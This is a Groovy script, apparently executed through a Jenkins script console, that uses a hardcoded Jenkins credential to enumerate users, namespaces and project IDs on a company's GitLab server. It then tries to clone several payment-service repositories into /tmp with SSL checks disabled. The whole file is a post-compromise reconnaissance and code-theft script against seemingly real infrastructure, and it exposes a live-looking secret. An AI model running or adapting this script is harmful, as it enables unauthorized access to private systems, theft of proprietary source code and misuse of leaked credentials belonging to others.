// MICRO-U: Clone more critical repos via GitLab API file access
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(5000)
}

def auth = "jenkins:e6LBqIkOI\$PR1XX2oia"

// Try to list claroshop namespace repos via API (user endpoint)
println "=== USER REPOS via API ==="
println run("curl -sk -u '${auth}' 'https://gitlab.dev.claroshop.com/api/v4/users?per_page=10' --max-time 8")

// Try namespace search
println "\n=== SEARCH claroshop namespace ==="
println run("curl -sk -u '${auth}' 'https://gitlab.dev.claroshop.com/api/v4/namespaces?search=claroshop' --max-time 8")

// Try to access caja group repos directly by path
def cajaRepos = ["caja/caja-pagos-api", "caja/t1-service", "caja/axii-service",
                 "caja/caja-api", "caja/caja-service", "caja/payment-service"]
println "\n=== TRYING CAJA GROUP REPO CLONES ==="
cajaRepos.each { repo ->
    def dest = "/tmp/gl_${repo.replace('/','_')}"
    def cloneUrl = "https://${auth}@gitlab.dev.claroshop.com/${repo}.git"
    def r = run("GIT_TERMINAL_PROMPT=0 git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' '${dest}' 2>&1 | tail -2")
    def listed = run("ls '${dest}' 2>/dev/null | head -3")
    if (listed) println "  CLONED: ${repo} → ${listed.replace('\n',' ')}"
    else println "  FAIL: ${repo} → ${r.take(80)}"
}

// Try GitLab API file access on known repo IDs (ID 826 is visible)
// Let's check what other project IDs are accessible
println "\n=== PROJECT ID SCAN (800-850) ==="
(820..835).each { id ->
    def r = run("curl -sk -u '${auth}' 'https://gitlab.dev.claroshop.com/api/v4/projects/${id}' --max-time 5 | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"path_with_namespace\", d.get(\"message\",\"?\")))'")
    if (!r.contains("404") && r.trim()) println "  ID:${id} → ${r.trim()}"
}

println "\n=== DONE MICRO-U ==="
